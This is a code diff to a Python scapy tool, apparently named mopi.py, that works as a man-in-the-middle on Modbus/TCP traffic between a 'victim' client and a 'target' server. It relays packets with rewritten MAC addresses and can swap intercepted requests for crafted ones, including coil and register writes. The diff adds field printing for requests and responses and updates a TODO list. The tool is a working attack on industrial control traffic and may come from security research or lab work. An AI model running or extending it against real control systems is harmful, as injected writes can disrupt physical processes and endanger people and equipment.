@@ -12,12 +12,12 @@ Requires: scapy and root privileges
 Usage:
   sudo python3 mopi.py -i eth0 -v 192.168.1.50 -t 192.168.1.10
 
-  
 Features to add:
-    - interactive mode: open prompt when the first modbus packet hits us, and allow user to select exactly what function and value they want to send
     - more output/logging to help debug + improve user experience
     - rename 'victim' and 'target' to 'client' and 'server'
     - complete other TODOs
+    - properly test interactive mode
+    - add ability to allow user to input config file which tells script how to modify every function type
   """
 
 import argparse
@@ -41,6 +41,7 @@ try:
     ModbusPDU06WriteSingleRegisterRequest,
     ModbusPDU0FWriteMultipleCoilsRequest,
     ModbusPDU10WriteMultipleRegistersRequest,
+    ModbusADUResponse
 )
 except ImportError:
     print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
@@ -49,15 +50,14 @@ except ImportError:
 VERSION="0.2"
 
 MODBUS_FUNCTION_CODES = {
-    0x01: "Read Coils",
-    0x02: "Read Discrete Inputs",
-    0x03: "Read Holding Registers",
-    0x04: "Read Input Registers",
-    0x05: "Write Single Coil",
-    0x06: "Write Single Register",
-    0x0F: "Write Multiple Coils",
-    0x10: "Write Multiple Registers",
-
+    0x01: "Read Coils",                 #1
+    0x02: "Read Discrete Inputs",       #2
+    0x03: "Read Holding Registers",     #3
+    0x04: "Read Input Registers",       #4
+    0x05: "Write Single Coil",          #5
+    0x06: "Write Single Register",      #6
+    0x0F: "Write Multiple Coils",       #10
+    0x10: "Write Multiple Registers",   #16
 }
 
 
@@ -131,6 +131,35 @@ def is_retransmission(pkt):
         print(f"Not a retransmission: {key} seq={seq}")
         return False
 
+def print_modbus_payload(mb):
+    func_code = mb.funcCode
+    func_name = MODBUS_FUNCTION_CODES.get(func_code, "Unknown/Reserved")
+    print(f"Function:\t\t{func_name} ({func_code})")
+
+    # The actual PDU is whatever Scapy parsed as the payload of the ADU
+    pdu = mb.payload
+
+    # Map of field name -> friendly label, checked in order, only printed if present
+    field_labels = [
+        ("startAddr", "Start Address"),
+        ("quantity", "Quantity"),
+        ("outputAddr", "Coil Address"),
+        ("outputValue", "Coil Value"),
+        ("registerAddr", "Register Address"),
+        ("registerValue", "Register Value"),
+        ("quantityOutput", "Quantity (Coils)"),
+        ("quantityRegisters", "Quantity (Registers)"),
+        ("outputsValue", "Values"),
+        ("byteCount", "Byte Count"),
+        ("registerVal", "Register Values"),
+        ("coilStatus", "Coil Status"),
+    ]
+
+    for field_name, label in field_labels:
+        if hasattr(pdu, field_name):
+            value = getattr(pdu, field_name)
+            print(f"{label}:\t\t{value}")
+
 def interactive_packet_craft():
     p=""
     print("1) Read Coils")
@@ -150,7 +179,6 @@ def interactive_packet_craft():
 
 
 def build_pdu(func_code: int):
-    """Prompt for the fields relevant to the selected function and return a PDU."""
     if func_code in (0x01, 0x02, 0x03, 0x04):
         # All read requests share the same two fields
         start_addr = int(input("Start address: "), 0)
@@ -205,7 +233,6 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
     # print("Source: "+src)
     # print("Dest: "+str(mappings[dst]))
 
-    # npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
     pkt[Ether].src=src
     pkt[Ether].dst=mappings[dst]
 
@@ -236,8 +263,10 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
         modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
 
         pkt = stripped / modbus_payload
-    else:
-        print("\nFunction:\t\t" + MODBUS_FUNCTION_CODES.get(pkt[ModbusADURequest].funcCode))
+    else: # just sniffing traffic
+        print("\nRequest Recieved:")
+        print_modbus_payload(pkt[ModbusADURequest])    
+        print("-"*16)
     del pkt[TCP].chksum
     del pkt[IP].chksum
 
@@ -245,8 +274,13 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
     # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
     response = srp1(pkt, timeout=3, verbose=0)
     if response:
-        print("Response received:")
-        response.show()
+        print("\nResponse received:")
+        # response.show()
+        if response.haslayer(ModbusADUResponse):
+            print_modbus_payload(response[ModbusADUResponse])
+            print("-"*16)
+        else:
+            print("Missing ModbusADUResponse layer...")
     else:
         print("No response — device may be down, dropping packets, or filtering the request")
 
